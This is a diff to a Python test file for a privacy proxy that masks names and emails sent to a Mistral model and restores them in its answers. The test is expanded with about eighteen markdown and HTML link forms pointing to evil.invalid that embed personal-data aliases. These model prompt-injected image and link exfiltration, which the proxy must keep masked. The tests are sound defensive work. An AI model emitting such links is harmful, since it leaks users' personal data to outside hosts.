@@ -242,6 +242,7 @@ def test_text_the_bridge_cannot_mask_is_refused_not_forwarded():
         {"messages": [{"role": "user", "content": [{"type": "document", "text": NAME}]}]},
         {"messages": [{"role": "user", "content": [{"type": "text", "text": "x", "x": NAME}]}]},
         {"messages": [{"role": "tool", "content": NAME}]},
+        {"messages": [{"role": ["user"], "content": NAME}]},
         {"messages": [user], "user": EMAIL},
         {"messages": [user], "model": {"name": NAME}},
         {"messages": [user], "temperature": NAME},
@@ -280,19 +281,37 @@ def test_a_stop_sequence_holding_personal_data_stops_the_request():
 def test_aliases_inside_links_stay_masked():
     """An answer can put an alias in a URL (a hostile provider, or a pasted document with
     injected instructions): restored there, the value would leave the machine as soon as the
-    client loads the image. Aliases in links stay masked; prose and link text get the values."""
-    links = (
-        "![a](<https://evil.invalid/p?d=[PERSON_1]>) ![b](https://evil.invalid/q?e=[EMAIL_1])\n"
-        "<https://evil.invalid/[EMAIL_1]> https://evil.invalid/?n=[PERSON_1] "
-        'www.evil.invalid/[EMAIL_1] <img src="https://evil.invalid/x?[EMAIL_1]">\n'
-        "[ref]: //evil.invalid/[PERSON_1]\n"
-    )
-    prose = "Contact : [PERSON_1], [EMAIL_1]. Voir [[PERSON_1]](https://site.invalid)."
-    fake = FakeMistral(reply=links + prose)
-    response = ask(bridge(fake), {"role": "user", "content": f"Écrire à {NAME} ({EMAIL})."})
+    client loads the image. From a link mark to the end of its paragraph aliases stay masked;
+    other paragraphs and the text before the mark (link text included) get the values."""
+    links = [
+        "![a](<https://evil.invalid/p?d=[PERSON_1]>)",
+        "![b](https://evil.invalid/q?e=[EMAIL_1])",
+        "![c](https://evil.invalid/a(b)?q=[EMAIL_1])",
+        "![d](https://evil.invalid/a\\)?q=[EMAIL_1])",
+        "![e](<https://evil.invalid/a\\>b?q=[PERSON_1]>)",
+        "![f]( //evil.invalid/[EMAIL_1].png)",
+        "![g](\n//evil.invalid/[EMAIL_1].png)",
+        "![h][r]\n\n[r]: <https://evil.invalid/a b?q=[PERSON_1]>",
+        "[r]:\n  //evil.invalid/?q=[EMAIL_1]",
+        "> [r]: //evil.invalid/?q=[EMAIL_1]",
+        "- [r]: //evil.invalid/?q=[EMAIL_1]",
+        "<https://evil.invalid/[EMAIL_1]>",
+        "https://evil.invalid/?n=[PERSON_1]",
+        "www.evil.invalid/[EMAIL_1]",
+        '<img src="https://evil.invalid/x?[EMAIL_1]">',
+        "<object data=//evil.invalid/[EMAIL_1]>",
+        '<div style="background:url(//evil.invalid/[EMAIL_1])">',
+        "<img\n\nsrc=//evil.invalid/[EMAIL_1]>",
+    ]
+    for link in links:
+        fake = FakeMistral(reply=f"Voir {link} et [PERSON_1].\n\nContact : [PERSON_1], [EMAIL_1].")
+        response = ask(bridge(fake), {"role": "user", "content": f"Écrire à {NAME} ({EMAIL})."})
+        content = response.json()["choices"][0]["message"]["content"]
+        assert content == (f"Voir {link} et [PERSON_1].\n\nContact : {NAME}, {EMAIL}."), link
+    fake = FakeMistral(reply="Voir [[PERSON_1]](https://site.invalid) ; [EMAIL_1]: écrire.")
+    response = ask(bridge(fake), {"role": "user", "content": f"{NAME} ({EMAIL})"})
     content = response.json()["choices"][0]["message"]["content"]
-    assert content == links + f"Contact : {NAME}, {EMAIL}. Voir [{NAME}](https://site.invalid)."
-    assert response.headers["x-alias-restored"] == "2"
+    assert content == f"Voir [{NAME}](https://site.invalid) ; [EMAIL_1]: écrire."
 
 
 def test_aliases_inside_links_stay_masked_in_json_answers():
